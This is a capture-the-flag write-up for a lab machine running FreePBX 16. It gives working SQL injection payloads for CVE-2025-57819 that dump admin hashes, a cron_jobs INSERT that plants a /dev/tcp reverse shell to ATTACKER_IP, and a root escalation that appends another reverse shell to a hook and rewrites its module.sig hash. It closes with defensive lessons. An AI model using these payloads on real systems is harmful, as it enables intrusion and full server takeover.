Connected

Easy Linux ✓ Pwned
Date 2026-06-09
OS Linux — CentOS 7
Stack Apache 2.4.6 + PHP 7.4.16 + FreePBX 16.0.40.7 (Asterisk)
CVEs CVE-2025-57819 (Endpoint SQLi → RCE)  ·  CVE-2025-61678 (root privesc)

Summary

Connected is a VoIP-themed box (commonName=pbxconnect) built around a FreePBX administration panel:

  1. Initial access — CVE-2025-57819: an unauthenticated SQL injection in the FreePBX endpoint module's brand parameter. Error-based extraction dumps admin hashes; an INSERT into the cron_jobs table turns SQLi into command execution as asterisk.
  2. Privilege escalation — an incrond watch fires sysadmin_manager as root. The adv_recovery module's hook script and its module.sig integrity file are both writable by asterisk, so we sign our own malicious hook and trigger it.

Reconnaissance

nmap -sC -sV -sT -p- 10.129.12.48

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4
80/tcp  open  http     Apache 2.4.6 (CentOS) PHP/7.4.16
443/tcp open  ssl/http Apache 2.4.6 (CentOS) PHP/7.4.16

The TLS certificate subject (commonName=pbxconnect) signals the Sangoma Connect module is installed. Browsing to http://connected.htb reveals a FreePBX 16.0.40.7 admin portal at /admin. That version is below the patched 16.0.88.19, making it vulnerable to CVE-2025-57819.

Initial Access — CVE-2025-57819 (Unauthenticated SQLi)

FreePBX's admin/libraries/BMO/Ajax.class.php enforces authentication:

if (!isset($_SESSION['AMP_user'])) {
    $this->ajaxError(401, 'Not Authenticated');
}

This protects standard module paths — but the Endpoint Manager registered itself using a full PHP namespace string. Passing it as the module GET parameter (with backslashes) resolves through a different class-loading path that bypasses the auth middleware entirely. The brand value in the model command is then concatenated into a SQL query with no sanitisation — unauthenticated database read/write:

GET /admin/ajax.php
  ?module=FreePBX\modules\endpoint\ajax
  &command=model&template=x&model=model
  &brand=x'<INJECTION>-- -

A valid Referer: http://connected.htb/admin/config.php header is required to pass an earlier check in ajax.php.

Confirming with error-based extraction

An EXTRACTVALUE() payload leaks query output inside an XPATH error message:

curl -s "http://connected.htb/admin/ajax.php?\
module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model\
&brand=x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -" \
  -H "Referer: http://connected.htb/admin/config.php"

{"error":{"message":"XPATH syntax error: '~freepbxuser@localhost~'"}}

Dumping admin credentials

Pull the FreePBX admin users from asterisk.ampusers (note: long values may need SUBSTRING() because EXTRACTVALUE truncates at ~32 chars):

... EXTRACTVALUE(1,CONCAT(0x7e,
   (SELECT GROUP_CONCAT(username,0x3a,password_sha1) FROM asterisk.ampusers),
   0x7e))-- -

The admin password_sha1 cracks against rockyou (hashcat SHA1 mode):

hashcat -m 100 admin.hash /usr/share/wordlists/rockyou.txt

SQLi → RCE via the cron_jobs table

FreePBX stores scheduled tasks in the MySQL cron_jobs table. When fwconsole job --run fires (every minute via asterisk's crontab), it reads this table and executes rows where class=NULL as raw shell commands. A stacked-query INSERT through the same injection plants a job whose command is a reverse shell — OS command execution as asterisk. Hex-encoding the string values avoids quote-breaking:

cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
def h(s): return "0x" + s.encode().hex()

payload = (
  f"x';INSERT INTO cron_jobs "
  f"(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)"
  f" VALUES ({h('sysadmin')},{h('htb_job')},{h(cmd)},NULL,"
  f"{h('* * * * *')},30,1,1)-- -"
)

Deliver the payload through the brand parameter, start a listener, and trigger job execution:

nc -lvnp 4444
fwconsole job --run asterisk     # (or wait for the schedule to fire)
foothold as asterisk
kali:~$ nc -lvnp 4444
connect to [ATTACKER_IP] from connected.htb ...
bash-4.2$ id
uid=995(asterisk) gid=995(asterisk) groups=995(asterisk)

Upgrade to a proper TTY and grab the user flag:

script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset; export TERM=xterm
cat /home/asterisk/user.txt

Privilege Escalation — incron + a self-signed hook

Enumerating root-owned but writable files, and the incron config, reveals the path:

find / -user root -writable -not -path "/proc/*" 2>/dev/null
# /var/www/html/admin/modules/adv_recovery/hooks/logrotate   <-- writable
# /var/www/html/admin/modules/adv_recovery/module.sig        <-- writable

cat /etc/incron.d/*
# /var/spool/asterisk/incron  IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#

The chain

asterisk writes a file to /var/spool/asterisk/incron/adv_recovery.logrotate
   ↓ incrond fires as root:  sysadmin_manager adv_recovery.logrotate
   ↓ sysadmin_manager validates sha256(hooks/logrotate) against module.sig
   ↓ ...but we can write BOTH the hook and the signature
   ↓ sysadmin_manager executes hooks/logrotate as root  →  our shell

Append a reverse shell to the hook, then re-sign it by patching the matching hash inside module.sig:

HOOK="/var/www/html/admin/modules/adv_recovery/hooks/logrotate"
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4446 0>&1' >> "$HOOK"

OLD="5f6ee08a7ca8f204dcd1d02e6257f6cc488cbd21b00edf06bed805e77b29db0b"
NEW=$(sha256sum "$HOOK" | awk '{print $1}')
SIG="/var/www/html/admin/modules/adv_recovery/module.sig"
sed -i "s/$OLD/$NEW/" "$SIG"

Start a listener and trigger the watch by closing a file in the watched directory:

nc -lvnp 4446
echo "trigger" > /var/spool/asterisk/incron/adv_recovery.logrotate
root shell
kali:~$ nc -lvnp 4446
connect to [ATTACKER_IP] from connected.htb ...
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt

Defensive Takeaways

  • Authentication bypasses are usually architectural. The SQLi wasn't reachable because someone forgot a password check — it was reachable because a module registered itself on a path the auth middleware never anticipated. Audit what your auth layer actually covers, not just whether it exists.
  • SQLi into metadata tables is RCE. FreePBX stored OS commands in a DB table and executed them. Treat write access to any scheduling/job table as potential code execution, and use parameterised queries everywhere.
  • An integrity check is worthless if the attacker controls the signature. The GPG signature in module.sig comes from FreePBX's servers and can't be forged — but sysadmin_manager compared the hook against a SHA-256 hash stored in that same locally-writable file. Control both the hook and the hash and the check gives zero protection. Keep module.sig root-owned and immutable.
  • incron is a high-value target. A root file-watch daemon acting on attacker-writable inputs (filenames or contents) is a classic privesc primitive — audit it like cron and systemd path units.
  • Salt and use slow hashes. Unsalted SHA1 in ampusers falls to a wordlist in seconds.
